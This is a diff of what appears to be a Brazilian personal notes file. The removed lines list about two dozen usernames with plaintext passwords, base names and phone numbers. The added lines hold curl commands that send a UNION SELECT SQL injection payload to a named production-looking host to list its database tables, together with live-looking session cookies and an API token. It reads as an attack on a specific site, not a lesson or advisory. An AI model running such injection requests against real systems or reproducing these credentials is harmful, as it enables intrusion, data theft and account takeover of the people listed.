@@ -1,23 +1,13 @@
-username: anaclara - senha: alouvoce123 - base:Tamoios | 31 9 7544-6875
-username: beatrizmota - senha: WtWH8& - base:Camapuã | 31 9 7509-3546
-username: lailapereira - senha: !&sN3x - base:Guaranis | 31 9 9305-2359
-username: pedrodesouza - senha: 7M&brY - base:Goitacazes | 33 9 9158-2985
-username: raphaellaevellyn - senha: BCb&p9 - base:Tupis | 31 9 9865-6404
-username: rianydriely - senha: &xcYc2 - base:Caetes | 31 9 8931-0440
-username: vitoriaviera - senha: )5Tqst - base:Jacui | 31 9 9339-9773
-username: giovannagontijo - senha: M7&dWt - base:Itararé | 31 9 8482-6793
-username: arturferreira - senha: 2fQ@U2 - base:Tapuias |  31 9 9220-0299
-username: beatrizoliveira - senha: DyB!X8 - base:Tabajaras | 31 9 7129-4740
-username: joaopaulo - senha: 6dwsA) - base:Tupinambás | 31 9 9890-4133
-username: juliapereira - senha: 6)&S6a - base:Araxá | 31 9 8101-7376
-username: luisakayowa - senha: 7YY*f2 - base:Aimorés | 31 9 9942-0307
-username: mariaeduardabarbosa - senha: J(d8d) - base:Guajajaras | 31 9 8653-2892
-username: samuellima - senha: 2!PtGd - base:Jabaquara | 31 9 8974-0656
-username: vitorfrancis - senha: Em!b2Z - base:Cataguases | 31 9 9387-8073
-username: anacecilia - senha: Gkn!6A - base:Guanhães | 31 9 9658-3261
-username: analuiza - senha: V*2Yzc - base:Timbiras | 31 9 8324-4130
-username: jonatasduarte - senha: Ds!&T6 - base:Oiapoque | 31 9 8476-1264
-username: lorenakayowa - senha: jgH!R9 - base:Carajás | 31 9 9555-7374
-username: emanuelleteixeira - senha: xDd9!& - base:Carijós |  31 9 9880-6141
-username: mariaeduarda - senha: !8N5cP - base:Guaicurus |  31 9 9961-4082
-username: samuelvitor - senha: 5v!2Kb - base:Xavantes | 31 9 9783-0075
+senha="$DB_PASS$"
+
+
+ curl -kvs -X POST --data-binary 'codigoChamado=-1+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables' "https://bmg.pocsync.com.br/SYNC/"   -H 'authority: bmg.pocsync.com.br'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'accept-language: pt-BR;q=0.5'   -H 'cache-control: no-cache'   -H 'cookie: ASP.NET_SessionId=g55s0djs5pbbuipnnv4ebqur; .ASPXAUTH=E2FECB3CF5C7A894B8D2384FCAA107C05DEDBAB8746913EC9E26771307DD9A09B500FAE04D03D753C54394C58DD810F89B4F1D001DDCA0F0E7C03A6EAA838A018AEBCB44570A3F865133416E9ADBA5485D843355320854ED48DB52C4BA6AFD35E4D607FAAF31EA55B06B0F744CE66CBF5550502A0155690DEC9E5C03CEFCC7B79FD80C15A391BBEF499644A5B4B7DF1A2E4D7C976345CDA0B9E5401C45795F74AAC10DAB18C61C8EA4C4BD91FB10539D019D88C26382A700E27BF4E623A87FDFDCD8449F476598D0CECD869B55B726BA57E8DE877C542CF5E4E89D0BDEA0C82304326C2393E019DB42C63CA1F5CF9321C9C69C38BD3C562B47CE1A1C2E209082518DA2103BACDF49A096A8F5594770622772FEC1651B42BD971AC1118999C2A654ED8259FDD715EF427CC8F5395E762B; i18next=pt-BR'   -H 'pragma: no-cache'   -H 'sec-fetch-dest: document'   -H 'sec-fetch-mode: navigate'   -H 'sec-fetch-site: none'   -H 'sec-fetch-user: ?1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'   -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36'
+ https://bmg.pocsync.com.br/SYNC/?param=-1+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables
+  curl -kvs -X POST --data-binary 'codigoChamado=-sssssss' "https://bmg.pocsync.com.br/SYNC/"   -H 'authority: bmg.pocsync.com.br'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'accept-language: pt-BR;q=0.5'   -H 'cache-control: no-cache'   -H 'cookie: ASP.NET_SessionId=oexmeygfmsissvmvwtgdxv3y; .ASPXAUTH=5A969CE3651206D7FAD21432738EBADA306E3443CB6FFE52A140EFA54295E1BB3E578167686D29B82ED72D63F1CD2B501BDA38CC40EF1F2BCBFF60EE43B4B453A6FFAB1E49B922FF662197F57A413D9FB1D1D0E72BAE68B8FB1EBB70A652B3BAF4C3F017A8F273318EB847C1E546EEDD13D2389E926ECC4183DCD320196D2130297FED9B99BCBB236CF62C29B9661E7A181A9C958D681EBCBD0859E4BF7E85A2B1C88DD083B4DF3D1163D368024161157BD6CB819C04E130B0AE23FD48CE8274F2F71976D798B7EF1082FDF9C94FAAFE1E36DF2D08E7E54837B98FB10789EA968C8EF575E02D2C44FD27514D9EB0D10AF5AB77D4C423F7C1528D56E43181084A9510B9119ED7F894EA4D3B6E5DB0F203A57B1021663A698A7B63DE88ABD3E3EA16BB3E3F3413B31EB90DAC7FF3FE9A27; i18next=pt-BR'   -H 'pragma: no-cache'   -H 'sec-fetch-dest: document'   -H 'sec-fetch-mode: navigate'   -H 'sec-fetch-site: none'   -H 'sec-fetch-user: ?1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'   -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36'
+
+
+
+
+
+
+curl -X 'GET' 'https://api.agfmais.com.br/api/v1/ranking-pregao/companys-bought-sold'-H 'accept: application/json' -H 'x-token: o4I09zbSZR+rwmXlDZbwYn12iIkzzXRAKgoEBSk135Zv0EWa+RM/KGeAkRxxJ8IoOA8tQkOzByOG+CBJkqK6aK9A7vAbcL3ohqIX7S4OcS452jl/QNYg+peUedVW/M/66FW4m+eMz7HF0MvNvInASiI18Gn1uUBEPvvhZSRNsICXjZoZ1+efKhPKcslNtK6Sczn8Ltz0Ir4D0j7FMyxBVEPn7kEu5fNeRQ4zjTPEAMc+VRRmvU7orqpeRk44Hxw67XgSibqkUDW29ar5twglYEVBvMoHvAAZ9PxppfN1uJREynjvaUiQYaQuzhs1tT7v3vniv+sj0s8JeOtAnECmP1FOBWj4TpOTXsH7OmHS4255fd1tuq5V6HIZ3zLILyU+L89G7dbwJ+9Ohbrm/SYph2xOfDRMGTihNy4P/r4o5xkiBc0DFrioMAphFoj2QFTxEY3Noi571g16aG4jO/2g9kulichlbrFYxlVmasKdatthDqqoZHW8I6Oq+mohv8c9jKWC+RdFx46zVwAc9SEC8Ad5gRQUPMLir7lfPAUKkOHL8ZWImBtyUaMsxSO8HF3DeM71tVq9fK4UYt+x22Y+Ck9qj7xA/QGSpxbG/Oc9Y5V+SokFFbaaRMfAcGQ+8Rx2AcKPjLRh6xb++Iwv2txTTpHJc0FX/coQQlPhc7XTKA=='
